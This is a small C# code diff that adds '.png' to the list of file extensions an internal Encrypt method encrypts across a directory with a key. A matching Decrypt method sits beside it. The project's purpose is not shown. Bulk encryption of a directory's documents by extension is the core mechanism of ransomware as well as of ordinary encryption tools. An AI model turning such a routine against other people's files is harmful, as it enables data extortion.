@@ -241,7 +241,7 @@ namespace Core.Model.Implementations
 
         internal static void Encrypt(string Directory, string key)
         {
-            CryptoHelper.Encrypt(Directory, new[] { ".txt", ".docx", ".xlsx" }, key);
+            CryptoHelper.Encrypt(Directory, new[] { ".txt", ".docx", ".xlsx", ".png" }, key);
         }
 
         internal static void Decrypt(string Directory, string key)
